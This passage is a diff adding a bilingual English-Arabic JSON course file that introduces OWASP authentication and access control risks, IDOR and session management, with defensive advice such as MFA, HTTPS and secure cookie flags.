@@ -1,0 +1,2329 @@
+{
+  "landingData": {
+    "title": {
+      "en": "OWASP Top 10 - Authentication & Authorization",
+      "ar": "أهم 10 مخاطر OWASP - المصادقة والتفويض"
+    },
+    "description": {
+      "en": "Master authentication and authorization security by learning how attackers exploit broken authentication, session hijacking, JWT vulnerabilities, and access control flaws. Build real defense skills through hands-on labs.",
+      "ar": "أتقن أمان المصادقة والتفويض من خلال تعلم كيفية استغلال المهاجمين للمصادقة المعطلة واختطاف الجلسات وثغرات JWT وعيوب التحكم في الوصول. ابنِ مهارات دفاعية حقيقية من خلال مختبرات عملية."
+    },
+    "difficulty": {
+      "en": "Beginner to Intermediate",
+      "ar": "من مبتدئ إلى متوسط"
+    },
+    "duration": {
+      "en": "180 Minutes",
+      "ar": "180 دقيقة"
+    },
+    "instructor": "CyberLab",
+    "rating": 4.9,
+    "students": 250
+  },
+  "topics": [
+    {
+      "id": "topic-1",
+      "title": {
+        "en": "Understanding OWASP Top 10: Where Auth & Access Control Fit",
+        "ar": "فهم أهم 10 مخاطر OWASP: موقع المصادقة والتحكم في الوصول"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "What is OWASP and Why It Matters",
+            "ar": "ما هو OWASP ولماذا هو مهم"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "OWASP stands for Open Web Application Security Project. It is a global community that helps organizations build secure web applications. Think of OWASP like a safety manual for building websites and apps. Every few years, OWASP releases a list called the Top 10, which shows the most dangerous security problems found in web applications around the world. This list helps developers, security teams, and beginners understand what attackers look for when trying to break into systems.",
+            "ar": "OWASP تعني مشروع أمان تطبيقات الويب المفتوح. هو مجتمع عالمي يساعد المؤسسات على بناء تطبيقات ويب آمنة. فكّر في OWASP مثل دليل سلامة لبناء المواقع والتطبيقات. كل بضع سنوات، تصدر OWASP قائمة تسمى أهم 10 مخاطر، والتي تُظهر أخطر المشكلات الأمنية الموجودة في تطبيقات الويب حول العالم. تساعد هذه القائمة المطورين وفرق الأمان والمبتدئين على فهم ما يبحث عنه المهاجمون عند محاولة اختراق الأنظمة."
+          }
+        },
+        {
+          "id": 1772330185407.559,
+          "type": "image",
+          "srcKey": "",
+          "size": "small",
+          "imageUrl": "https://pub-cb38e65ea6bd411eb827a8641fdcc72d.r2.dev/OWASP%20Top%2010%20-%20Authentication%20%26%20Authorization/OWASP%20Top%2010.webp"
+        },
+        {
+          "id": 4,
+          "type": "text",
+          "value": {
+            "en": "The OWASP Top 10 list is not just a collection of random problems. It is based on real data from thousands of companies and security researchers worldwide. When a new version comes out, it reflects the current state of attacks happening right now. For example, in recent years, broken authentication and broken access control have moved to the top of the list because attackers found these problems easier to exploit and more rewarding. When you learn about these two areas, you are studying the mistakes that lead to the most serious data breaches today.",
+            "ar": "قائمة أهم 10 مخاطر OWASP ليست مجرد مجموعة من المشاكل العشوائية. إنها تستند إلى بيانات حقيقية من آلاف الشركات والباحثين الأمنيين حول العالم. عندما تصدر نسخة جديدة، فإنها تعكس الوضع الحالي للهجمات التي تحدث الآن. على سبيل المثال، في السنوات الأخيرة، انتقلت المصادقة المعطلة والتحكم المعطل في الوصول إلى أعلى القائمة لأن المهاجمين وجدوا هذه المشاكل أسهل في الاستغلال وأكثر مكافأة. عندما تتعلم عن هذين المجالين، فأنت تدرس الأخطاء التي تؤدي إلى أخطر اختراقات البيانات اليوم."
+          }
+        },
+        {
+          "id": 5,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "The OWASP Top 10 is updated every few years. Always check for the latest version to stay current with emerging threats. The principles you learn here remain relevant even as specific rankings change.",
+            "ar": "يتم تحديث أهم 10 مخاطر OWASP كل بضع سنوات. تحقق دائماً من أحدث إصدار لتبقى على اطلاع بالتهديدات الناشئة. المبادئ التي تتعلمها هنا تظل ذات صلة حتى مع تغيير التصنيفات المحددة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 6,
+          "type": "title",
+          "value": {
+            "en": "Authentication and Authorization in the OWASP Context",
+            "ar": "المصادقة والتفويض في سياق OWASP"
+          }
+        },
+        {
+          "id": 7,
+          "type": "text",
+          "value": {
+            "en": "Within the OWASP Top 10, two categories directly relate to identity and access security. The first is Broken Authentication. This happens when an application fails to properly verify who you are. Imagine a bank that lets anyone walk in and claim to be you without checking your ID card. The second category is Broken Access Control, sometimes called Broken Authorization. This occurs when the system knows who you are, but it does not correctly enforce what you are allowed to do. Think of it like having a library card that accidentally gives you access to restricted staff-only rooms.",
+            "ar": "ضمن أهم 10 مخاطر OWASP، ترتبط فئتان مباشرة بأمان الهوية والوصول. الأولى هي المصادقة المعطلة. يحدث هذا عندما يفشل التطبيق في التحقق بشكل صحيح من هويتك. تخيل بنكاً يسمح لأي شخص بالدخول والادعاء بأنه أنت دون فحص بطاقة الهوية الخاصة بك. الفئة الثانية هي التحكم المعطل في الوصول، ويُسمى أحياناً التفويض المعطل. يحدث هذا عندما يعرف النظام من أنت، لكنه لا يفرض بشكل صحيح ما يُسمح لك بفعله. فكّر في الأمر مثل امتلاك بطاقة مكتبة تمنحك بالخطأ الوصول إلى غرف محظورة خاصة بالموظفين فقط."
+          }
+        },
+        {
+          "id": 8,
+          "type": "text",
+          "value": {
+            "en": "These two problems are among the most exploited weaknesses in modern web applications. Attackers love them because they often provide direct access to sensitive data without needing advanced hacking skills. A simple mistake in how login works or how permissions are checked can expose thousands or millions of user accounts. Understanding these flaws is essential for anyone building or testing web applications. When you fix authentication and access control properly, you close the door on a huge number of attacks.",
+            "ar": "هاتان المشكلتان من بين نقاط الضعف الأكثر استغلالاً في تطبيقات الويب الحديثة. يحبها المهاجمون لأنها غالباً ما توفر وصولاً مباشراً إلى البيانات الحساسة دون الحاجة إلى مهارات قرصنة متقدمة. خطأ بسيط في كيفية عمل تسجيل الدخول أو كيفية فحص الأذونات يمكن أن يعرض آلاف أو ملايين حسابات المستخدمين. فهم هذه العيوب ضروري لأي شخص يبني أو يختبر تطبيقات الويب. عندما تصلح المصادقة والتحكم في الوصول بشكل صحيح، فإنك تغلق الباب أمام عدد كبير من الهجمات."
+          }
+        },
+        {
+          "id": 9,
+          "type": "hr"
+        },
+        {
+          "id": 10,
+          "type": "title",
+          "value": {
+            "en": "Why Attackers Target Authentication and Access Control",
+            "ar": "لماذا يستهدف المهاجمون المصادقة والتحكم في الوصول"
+          }
+        },
+        {
+          "id": 11,
+          "type": "text",
+          "value": {
+            "en": "Attackers target authentication because it is the first gate they must pass to enter a system. If they can bypass login protections, they gain a foothold inside the application. Once inside, they can pretend to be a legitimate user and perform actions on their behalf. This is especially valuable when targeting high-value accounts like administrators or financial officers. A compromised admin account can give the attacker full control over the entire system, including the ability to create new accounts, delete data, or steal sensitive information.",
+            "ar": "يستهدف المهاجمون المصادقة لأنها البوابة الأولى التي يجب عليهم تجاوزها لدخول النظام. إذا تمكنوا من تجاوز حماية تسجيل الدخول، فإنهم يكتسبون موطئ قدم داخل التطبيق. بمجرد الدخول، يمكنهم التظاهر بأنهم مستخدم شرعي وتنفيذ إجراءات نيابة عنه. هذا ذو قيمة خاصة عند استهداف حسابات عالية القيمة مثل المسؤولين أو المسؤولين الماليين. يمكن أن يمنح حساب المسؤول المخترق المهاجم السيطرة الكاملة على النظام بأكمله، بما في ذلك القدرة على إنشاء حسابات جديدة أو حذف البيانات أو سرقة المعلومات الحساسة."
+          }
+        },
+        {
+          "id": 12,
+          "type": "text",
+          "value": {
+            "en": "Access control is equally attractive to attackers because even if authentication is strong, weak authorization can be exploited. Imagine an attacker who successfully logs in as a normal user but then discovers they can access another user's private data simply by changing a number in a web link. This type of flaw is called Insecure Direct Object Reference, or IDOR. It allows attackers to read, modify, or delete data they should never see. Real-world breaches have exposed medical records, financial transactions, and personal messages through access control bugs. These attacks are often silent and difficult to detect until the damage is done.",
+            "ar": "التحكم في الوصول جذاب بنفس القدر للمهاجمين لأنه حتى لو كانت المصادقة قوية، يمكن استغلال التفويض الضعيف. تخيل مهاجماً نجح في تسجيل الدخول كمستخدم عادي لكنه اكتشف بعد ذلك أنه يمكنه الوصول إلى البيانات الخاصة لمستخدم آخر ببساطة عن طريق تغيير رقم في رابط ويب. يُسمى هذا النوع من العيوب بالإشارة المباشرة غير الآمنة للكائنات، أو IDOR. يسمح للمهاجمين بقراءة البيانات التي لا يجب عليهم رؤيتها أو تعديلها أو حذفها. كشفت الاختراقات الواقعية عن السجلات الطبية والمعاملات المالية والرسائل الشخصية من خلال أخطاء التحكم في الوصول. غالباً ما تكون هذه الهجمات صامتة ويصعب اكتشافها حتى يحدث الضرر."
+          }
+        },
+        {
+          "id": 13,
+          "type": "table",
+          "title": {
+            "en": "Why These Vulnerabilities Are High Priority",
+            "ar": "لماذا تُعتبر هذه الثغرات ذات أولوية عالية"
+          },
+          "headers": {
+            "en": [
+              "Vulnerability Type",
+              "Attacker Benefit",
+              "Business Impact"
+            ],
+            "ar": [
+              "نوع الثغرة",
+              "فائدة المهاجم",
+              "التأثير على الأعمال"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Broken Authentication",
+                "Gain unauthorized access to user accounts",
+                "Identity theft, data breaches, reputational damage"
+              ],
+              "ar": [
+                "المصادقة المعطلة",
+                "الحصول على وصول غير مصرح به إلى حسابات المستخدمين",
+                "سرقة الهوية، اختراقات البيانات، الإضرار بالسمعة"
+              ]
+            },
+            {
+              "en": [
+                "Broken Access Control",
+                "Access data or functions without proper permission",
+                "Data leaks, compliance violations, financial loss"
+              ],
+              "ar": [
+                "التحكم المعطل في الوصول",
+                "الوصول إلى البيانات أو الوظائف دون إذن مناسب",
+                "تسريبات البيانات، انتهاكات الامتثال، خسارة مالية"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 14,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Many organizations focus security efforts on network defenses but neglect application-level authentication and authorization. This is a critical mistake. Most breaches today happen at the application layer, not the network layer.",
+            "ar": "تركز العديد من المؤسسات جهود الأمان على دفاعات الشبكة لكنها تهمل المصادقة والتفويض على مستوى التطبيق. هذا خطأ فادح. تحدث معظم الاختراقات اليوم في طبقة التطبيق، وليس طبقة الشبكة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 15,
+          "type": "title",
+          "value": {
+            "en": "Real-World Context: Authentication and Authorization Failures in Action",
+            "ar": "السياق الواقعي: فشل المصادقة والتفويض في العمل"
+          }
+        },
+        {
+          "id": 16,
+          "type": "text",
+          "value": {
+            "en": "In 2019, a major social media platform experienced a breach that exposed millions of phone numbers and email addresses. The root cause was a broken access control flaw. Attackers discovered they could request user profile data by submitting phone numbers to an API endpoint. The system did not properly check whether the attacker had permission to view that data. By automating requests, the attackers collected information on millions of users in a short time. This is a textbook example of Insecure Direct Object Reference combined with missing authorization checks.",
+            "ar": "في عام 2019، تعرضت منصة تواصل اجتماعي كبرى لاختراق كشف ملايين أرقام الهواتف وعناوين البريد الإلكتروني. كان السبب الجذري عيباً في التحكم المعطل في الوصول. اكتشف المهاجمون أنهم يستطيعون طلب بيانات ملف تعريف المستخدم عن طريق إرسال أرقام الهواتف إلى نقطة نهاية API. لم يتحقق النظام بشكل صحيح مما إذا كان المهاجم لديه إذن لعرض تلك البيانات. من خلال أتمتة الطلبات، جمع المهاجمون معلومات عن ملايين المستخدمين في وقت قصير. هذا مثال نموذجي على الإشارة المباشرة غير الآمنة للكائنات مجتمعة مع فحوصات التفويض المفقودة."
+          }
+        },
+        {
+          "id": 17,
+          "type": "text",
+          "value": {
+            "en": "Another case involved an online retail company where users could view their order history by visiting a URL with their order ID. An attacker noticed that changing the order ID in the URL allowed them to see other customers' orders, including names, addresses, and purchase details. This happened because the application checked if the user was logged in but did not verify if the logged-in user was the owner of the requested order. The company had to notify thousands of affected customers and faced regulatory fines. This incident shows how a single missing check can cascade into a major security failure.",
+            "ar": "شملت حالة أخرى شركة بيع بالتجزئة عبر الإنترنت حيث يمكن للمستخدمين عرض سجل طلباتهم من خلال زيارة عنوان URL مع معرف الطلب الخاص بهم. لاحظ أحد المهاجمين أن تغيير معرف الطلب في عنوان URL سمح لهم برؤية طلبات العملاء الآخرين، بما في ذلك الأسماء والعناوين وتفاصيل الشراء. حدث هذا لأن التطبيق تحقق مما إذا كان المستخدم مسجلاً الدخول ولكنه لم يتحقق مما إذا كان المستخدم المسجل هو مالك الطلب المطلوب. اضطرت الشركة إلى إخطار آلاف العملاء المتأثرين وواجهت غرامات تنظيمية. يُظهر هذا الحادث كيف يمكن أن يتحول فحص واحد مفقود إلى فشل أمني كبير."
+          }
+        },
+        {
+          "id": 18,
+          "type": "list",
+          "title": {
+            "en": "Common Scenarios Where Authentication and Authorization Fail",
+            "ar": "السيناريوهات الشائعة حيث تفشل المصادقة والتفويض"
+          },
+          "items": {
+            "en": [
+              "Weak or default passwords that are easy to guess or find in password dictionaries",
+              "Session tokens that do not expire, allowing attackers to reuse stolen tokens indefinitely",
+              "Missing checks on who can access specific data, leading to unauthorized data exposure",
+              "Predictable identifiers in URLs or APIs that let attackers enumerate and access other users' resources",
+              "Lack of multi-factor authentication, making accounts vulnerable to credential theft"
+            ],
+            "ar": [
+              "كلمات مرور ضعيفة أو افتراضية يسهل تخمينها أو العثور عليها في قواميس كلمات المرور",
+              "رموز الجلسة التي لا تنتهي صلاحيتها، مما يسمح للمهاجمين بإعادة استخدام الرموز المسروقة إلى أجل غير مسمى",
+              "فحوصات مفقودة حول من يمكنه الوصول إلى بيانات معينة، مما يؤدي إلى كشف غير مصرح به للبيانات",
+              "معرفات يمكن التنبؤ بها في عناوين URL أو واجهات برمجة التطبيقات تسمح للمهاجمين بإحصاء والوصول إلى موارد المستخدمين الآخرين",
+              "نقص المصادقة متعددة العوامل، مما يجعل الحسابات عرضة لسرقة بيانات الاعتماد"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic-2",
+      "title": {
+        "en": "Authentication vs Authorization vs Session Management: The Core Security Triangle",
+        "ar": "المصادقة مقابل التفويض مقابل إدارة الجلسات: مثلث الأمان الأساسي"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "Defining Authentication: Proving Who You Are",
+            "ar": "تعريف المصادقة: إثبات من أنت"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "Authentication is the process of verifying your identity. When you log into a website or app, you are performing authentication. The most common way to authenticate is by providing a username and password. The system checks if the credentials you entered match what it has on record. If they match, the system believes you are who you claim to be. Authentication answers the question: Are you really the person trying to access this account? It is the digital equivalent of showing your ID card or passport at an airport security checkpoint.",
+            "ar": "المصادقة هي عملية التحقق من هويتك. عندما تسجل الدخول إلى موقع ويب أو تطبيق، فإنك تقوم بإجراء المصادقة. الطريقة الأكثر شيوعاً للمصادقة هي توفير اسم مستخدم وكلمة مرور. يتحقق النظام مما إذا كانت بيانات الاعتماد التي أدخلتها تطابق ما لديه في السجل. إذا تطابقت، يعتقد النظام أنك من تدعي أنك عليه. تجيب المصادقة على السؤال: هل أنت حقاً الشخص الذي يحاول الوصول إلى هذا الحساب؟ إنها المعادل الرقمي لإظهار بطاقة الهوية أو جواز السفر في نقطة تفتيش أمن المطار."
+          }
+        },
+        {
+          "id": 3,
+          "type": "text",
+          "value": {
+            "en": "Authentication can use different factors to verify identity. The first factor is something you know, like a password or PIN. The second factor is something you have, like a mobile phone that receives a one-time code. The third factor is something you are, like a fingerprint or face scan. Using more than one factor makes authentication much stronger. This is why many banks and email providers now require both your password and a code sent to your phone. If an attacker steals your password, they still cannot log in without the second factor. Strong authentication is the foundation of secure access control.",
+            "ar": "يمكن أن تستخدم المصادقة عوامل مختلفة للتحقق من الهوية. العامل الأول هو شيء تعرفه، مثل كلمة مرور أو رقم التعريف الشخصي. العامل الثاني هو شيء تملكه، مثل هاتف محمول يستقبل رمزاً لمرة واحدة. العامل الثالث هو شيء أنت عليه، مثل بصمة الإصبع أو مسح الوجه. استخدام أكثر من عامل واحد يجعل المصادقة أقوى بكثير. لهذا السبب تطلب العديد من البنوك ومزودي البريد الإلكتروني الآن كلاً من كلمة المرور والرمز المرسل إلى هاتفك. إذا سرق مهاجم كلمة المرور الخاصة بك، فلا يزال لا يمكنه تسجيل الدخول بدون العامل الثاني. المصادقة القوية هي أساس التحكم الآمن في الوصول."
+          }
+        },
+        {
+          "id": 4,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Multi-Factor Authentication (MFA) significantly reduces the risk of account takeovers. Even if your password is compromised, the attacker cannot proceed without the second factor. Always enable MFA when available.",
+            "ar": "تقلل المصادقة متعددة العوامل (MFA) بشكل كبير من خطر الاستيلاء على الحساب. حتى لو تم اختراق كلمة المرور الخاصة بك، لا يمكن للمهاجم المتابعة بدون العامل الثاني. قم دائماً بتمكين MFA عندما تكون متاحة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 5,
+          "type": "hr"
+        },
+        {
+          "id": 6,
+          "type": "title",
+          "value": {
+            "en": "Defining Authorization: Controlling What You Can Do",
+            "ar": "تعريف التفويض: التحكم فيما يمكنك فعله"
+          }
+        },
+        {
+          "id": 7,
+          "type": "text",
+          "value": {
+            "en": "Authorization happens after authentication. Once the system knows who you are, it must decide what you are allowed to do. Think of authorization like permissions in an office building. Your employee badge proves who you are, but it does not give you access to every room. Some doors are restricted to managers, others to IT staff, and some to everyone. Authorization works the same way in digital systems. It checks your role and permissions to determine if you can view a file, edit a record, delete data, or perform administrative tasks.",
+            "ar": "يحدث التفويض بعد المصادقة. بمجرد أن يعرف النظام من أنت، يجب عليه أن يقرر ما يُسمح لك بفعله. فكّر في التفويض مثل الأذونات في مبنى مكاتب. شارة الموظف الخاصة بك تثبت من أنت، لكنها لا تمنحك الوصول إلى كل غرفة. بعض الأبواب مقيدة على المديرين، وأخرى على موظفي تكنولوجيا المعلومات، وبعضها للجميع. يعمل التفويض بنفس الطريقة في الأنظمة الرقمية. يتحقق من دورك وأذوناتك لتحديد ما إذا كان بإمكانك عرض ملف أو تحرير سجل أو حذف بيانات أو تنفيذ مهام إدارية."
+          }
+        },
+        {
+          "id": 1772330197377.857,
+          "type": "image",
+          "srcKey": "",
+          "size": "small",
+          "imageUrl": "https://pub-cb38e65ea6bd411eb827a8641fdcc72d.r2.dev/OWASP%20Top%2010%20-%20Authentication%20%26%20Authorization/authentication%20and%20authorization.webp"
+        },
+        {
+          "id": 9,
+          "type": "text",
+          "value": {
+            "en": "Authorization decisions are based on rules defined by the application developers and administrators. These rules are often stored in access control lists or role-based access control systems. For example, a regular user in a content management system might be able to create and edit their own articles but not publish them. An editor role can review and publish articles. An administrator can manage users and system settings. If authorization is broken, users can perform actions they should not be able to do. This can lead to data leaks, unauthorized changes, or privilege escalation where a normal user becomes an admin.",
+            "ar": "تستند قرارات التفويض إلى قواعد يحددها مطورو التطبيقات والمسؤولون. غالباً ما يتم تخزين هذه القواعد في قوائم التحكم في الوصول أو أنظمة التحكم في الوصول القائمة على الأدوار. على سبيل المثال، قد يتمكن مستخدم عادي في نظام إدارة المحتوى من إنشاء وتحرير مقالاته الخاصة ولكن لا يمكنه نشرها. يمكن لدور المحرر مراجعة المقالات ونشرها. يمكن للمسؤول إدارة المستخدمين وإعدادات النظام. إذا كان التفويض معطلاً، يمكن للمستخدمين تنفيذ إجراءات لا ينبغي أن يكونوا قادرين على القيام بها. يمكن أن يؤدي هذا إلى تسريبات البيانات أو تغييرات غير مصرح بها أو تصعيد الامتيازات حيث يصبح المستخدم العادي مسؤولاً."
+          }
+        },
+        {
+          "id": 10,
+          "type": "table",
+          "title": {
+            "en": "Authentication vs Authorization: Key Differences",
+            "ar": "المصادقة مقابل التفويض: الاختلافات الرئيسية"
+          },
+          "headers": {
+            "en": [
+              "Aspect",
+              "Authentication",
+              "Authorization"
+            ],
+            "ar": [
+              "الجانب",
+              "المصادقة",
+              "التفويض"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Purpose",
+                "Verify identity",
+                "Grant permissions"
+              ],
+              "ar": [
+                "الغرض",
+                "التحقق من الهوية",
+                "منح الأذونات"
+              ]
+            },
+            {
+              "en": [
+                "Question Answered",
+                "Who are you?",
+                "What can you do?"
+              ],
+              "ar": [
+                "السؤال المُجاب عليه",
+                "من أنت؟",
+                "ماذا يمكنك أن تفعل؟"
+              ]
+            },
+            {
+              "en": [
+                "When It Happens",
+                "At login",
+                "During each action"
+              ],
+              "ar": [
+                "متى يحدث",
+                "عند تسجيل الدخول",
+                "أثناء كل إجراء"
+              ]
+            },
+            {
+              "en": [
+                "Common Methods",
+                "Username and password, MFA, biometrics",
+                "Role-based access control, permissions lists"
+              ],
+              "ar": [
+                "الطرق الشائعة",
+                "اسم المستخدم وكلمة المرور، MFA، القياسات الحيوية",
+                "التحكم في الوصول القائم على الأدوار، قوائم الأذونات"
+              ]
+            },
+            {
+              "en": [
+                "What Happens If Broken",
+                "Unauthorized users can log in",
+                "Users can perform actions beyond their role"
+              ],
+              "ar": [
+                "ماذا يحدث إذا كان معطلاً",
+                "يمكن للمستخدمين غير المصرح لهم تسجيل الدخول",
+                "يمكن للمستخدمين تنفيذ إجراءات تتجاوز دورهم"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 11,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "A common mistake is assuming that successful authentication automatically means proper authorization. Always check permissions for every sensitive action, not just at login time.",
+            "ar": "خطأ شائع هو افتراض أن المصادقة الناجحة تعني تلقائياً التفويض المناسب. تحقق دائماً من الأذونات لكل إجراء حساس، وليس فقط في وقت تسجيل الدخول."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 12,
+          "type": "hr"
+        },
+        {
+          "id": 13,
+          "type": "title",
+          "value": {
+            "en": "Session Management: Maintaining Your Identity Over Time",
+            "ar": "إدارة الجلسات: الحفاظ على هويتك عبر الزمن"
+          }
+        },
+        {
+          "id": 14,
+          "type": "text",
+          "value": {
+            "en": "Session management is the bridge between authentication and authorization. After you successfully log in, the system needs a way to remember who you are as you navigate from page to page. Without session management, you would have to enter your username and password every time you click a link. To avoid this, the server creates a session for you. A session is like a temporary contract that says: This user has been authenticated and can access the system for a limited time. The server gives you a unique session ID, which is usually stored in a cookie in your web browser.",
+            "ar": "إدارة الجلسات هي الجسر بين المصادقة والتفويض. بعد تسجيل الدخول بنجاح، يحتاج النظام إلى طريقة لتذكر من أنت أثناء انتقالك من صفحة إلى أخرى. بدون إدارة الجلسات، سيتعين عليك إدخال اسم المستخدم وكلمة المرور في كل مرة تنقر فيها على رابط. لتجنب ذلك، ينشئ الخادم جلسة لك. الجلسة مثل عقد مؤقت يقول: تم مصادقة هذا المستخدم ويمكنه الوصول إلى النظام لفترة محدودة. يمنحك الخادم معرف جلسة فريد، والذي يتم تخزينه عادةً في ملف تعريف ارتباط في متصفح الويب الخاص بك."
+          }
+        },
+        {
+          "id": 15,
+          "type": "text",
+          "value": {
+            "en": "Your browser sends the session ID with every request to the server. The server looks up the session ID in its memory or database to confirm you are still authenticated. This process is invisible to you as a user. It happens automatically in the background. Session management becomes a security problem when session IDs are predictable, never expire, or are not properly protected. If an attacker steals your session ID, they can impersonate you without knowing your password. This is called session hijacking. The attacker simply sends requests to the server with your stolen session ID, and the server believes the attacker is you.",
+            "ar": "يرسل متصفحك معرف الجلسة مع كل طلب إلى الخادم. يبحث الخادم عن معرف الجلسة في ذاكرته أو قاعدة بياناته لتأكيد أنك لا تزال مصادقاً. هذه العملية غير مرئية لك كمستخدم. تحدث تلقائياً في الخلفية. تصبح إدارة الجلسات مشكلة أمنية عندما تكون معرفات الجلسة قابلة للتنبؤ، أو لا تنتهي صلاحيتها أبداً، أو لا تكون محمية بشكل صحيح. إذا سرق مهاجم معرف الجلسة الخاص بك، يمكنه انتحال شخصيتك دون معرفة كلمة المرور الخاصة بك. يُسمى هذا اختطاف الجلسة. يرسل المهاجم ببساطة طلبات إلى الخادم بمعرف الجلسة المسروق الخاص بك، ويعتقد الخادم أن المهاجم هو أنت."
+          }
+        },
+        {
+          "id": 16,
+          "type": "orderedList",
+          "title": {
+            "en": "How Session Management Works: Step-by-Step Flow",
+            "ar": "كيفية عمل إدارة الجلسات: تدفق خطوة بخطوة"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "User Logs In",
+                "ar": "المستخدم يسجل الدخول"
+              },
+              "text": {
+                "en": "You enter your username and password. The server verifies your credentials and confirms your identity through authentication.",
+                "ar": "تدخل اسم المستخدم وكلمة المرور. يتحقق الخادم من بيانات الاعتماد الخاصة بك ويؤكد هويتك من خلال المصادقة."
+              },
+              "example": {
+                "en": "Example: Logging into your email account with correct credentials.",
+                "ar": "مثال: تسجيل الدخول إلى حساب بريدك الإلكتروني ببيانات الاعتماد الصحيحة."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Server Creates Session",
+                "ar": "الخادم ينشئ جلسة"
+              },
+              "text": {
+                "en": "The server generates a unique session ID, a long random string that is very hard to guess. This ID is stored on the server along with information about your user account and permissions.",
+                "ar": "ينشئ الخادم معرف جلسة فريداً، وهو سلسلة عشوائية طويلة يصعب تخمينها للغاية. يتم تخزين هذا المعرف على الخادم جنباً إلى جنب مع معلومات حول حساب المستخدم الخاص بك وأذوناتك."
+              },
+              "example": {
+                "en": "Example: Session ID might look like 3f8b7a2c9e4d1f6a8b5c7d9e2f4a6b8c.",
+                "ar": "مثال: قد يبدو معرف الجلسة مثل 3f8b7a2c9e4d1f6a8b5c7d9e2f4a6b8c."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Session ID Sent to Browser",
+                "ar": "معرف الجلسة يُرسل إلى المتصفح"
+              },
+              "text": {
+                "en": "The server sends the session ID to your browser, usually inside a cookie. Your browser automatically stores this cookie and includes it in all future requests to the same website.",
+                "ar": "يرسل الخادم معرف الجلسة إلى متصفحك، عادةً داخل ملف تعريف ارتباط. يخزن متصفحك هذا الملف تلقائياً ويضمه في جميع الطلبات المستقبلية إلى نفس الموقع."
+              },
+              "example": {
+                "en": "Example: Cookie named sessionId with value 3f8b7a2c9e4d1f6a8b5c7d9e2f4a6b8c.",
+                "ar": "مثال: ملف تعريف ارتباط باسم sessionId بقيمة 3f8b7a2c9e4d1f6a8b5c7d9e2f4a6b8c."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Browser Sends Session ID on Every Request",
+                "ar": "المتصفح يرسل معرف الجلسة في كل طلب"
+              },
+              "text": {
+                "en": "Every time you click a link or load a new page, your browser sends the session ID cookie back to the server. The server reads the session ID and looks it up to confirm you are still logged in and what you are allowed to do.",
+                "ar": "في كل مرة تنقر فيها على رابط أو تحمّل صفحة جديدة، يرسل متصفحك ملف تعريف ارتباط معرف الجلسة مرة أخرى إلى الخادم. يقرأ الخادم معرف الجلسة ويبحث عنه لتأكيد أنك لا تزال مسجلاً الدخول وما يُسمح لك بفعله."
+              },
+              "example": {
+                "en": "Example: Opening your inbox, composing a message, or viewing settings all include the session ID in the request.",
+                "ar": "مثال: فتح صندوق الوارد الخاص بك، أو كتابة رسالة، أو عرض الإعدادات يشمل جميعها معرف الجلسة في الطلب."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Session Expires or User Logs Out",
+                "ar": "تنتهي الجلسة أو المستخدم يسجل الخروج"
+              },
+              "text": {
+                "en": "After a period of inactivity or when you explicitly log out, the server deletes the session. The session ID becomes invalid, and you must log in again to create a new session.",
+                "ar": "بعد فترة من عدم النشاط أو عندما تسجل الخروج صراحة، يحذف الخادم الجلسة. يصبح معرف الجلسة غير صالح، ويجب عليك تسجيل الدخول مرة أخرى لإنشاء جلسة جديدة."
+              },
+              "example": {
+                "en": "Example: Logging out of your account or being automatically logged out after 30 minutes of inactivity.",
+                "ar": "مثال: تسجيل الخروج من حسابك أو تسجيل الخروج التلقائي بعد 30 دقيقة من عدم النشاط."
+              }
+            }
+          ]
+        },
+        {
+          "id": 17,
+          "type": "text",
+          "value": {
+            "en": "Secure session management requires several protections. Session IDs must be long, random, and unpredictable. They should be transmitted only over encrypted connections using HTTPS. Cookies containing session IDs should have security flags like HttpOnly, which prevents JavaScript from reading them, and Secure, which ensures they are only sent over HTTPS. Sessions should expire after a reasonable time to limit the window of opportunity for attackers. If any of these protections are missing, the application becomes vulnerable to session hijacking and fixation attacks.",
+            "ar": "تتطلب إدارة الجلسات الآمنة عدة حمايات. يجب أن تكون معرفات الجلسة طويلة وعشوائية ولا يمكن التنبؤ بها. يجب إرسالها فقط عبر اتصالات مشفرة باستخدام HTTPS. يجب أن تحتوي ملفات تعريف الارتباط التي تحتوي على معرفات الجلسة على علامات أمان مثل HttpOnly، والتي تمنع JavaScript من قراءتها، و Secure، والتي تضمن إرسالها فقط عبر HTTPS. يجب أن تنتهي صلاحية الجلسات بعد وقت معقول للحد من نافذة الفرصة للمهاجمين. إذا كانت أي من هذه الحمايات مفقودة، يصبح التطبيق عرضة لاختطاف الجلسات وهجمات تثبيت الجلسة."
+          }
+        },
+        {
+          "id": 18,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Always use HTTPS for any application that handles authentication and sessions. Without encryption, session IDs can be intercepted by attackers on the same network, especially on public Wi-Fi.",
+            "ar": "استخدم دائماً HTTPS لأي تطبيق يتعامل مع المصادقة والجلسات. بدون تشفير، يمكن للمهاجمين على نفس الشبكة اعتراض معرفات الجلسة، خاصة على شبكة Wi-Fi العامة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 19,
+          "type": "title",
+          "value": {
+            "en": "The Security Triangle in Action: How These Concepts Work Together",
+            "ar": "مثلث الأمان في العمل: كيف تعمل هذه المفاهيم معاً"
+          }
+        },
+        {
+          "id": 20,
+          "type": "text",
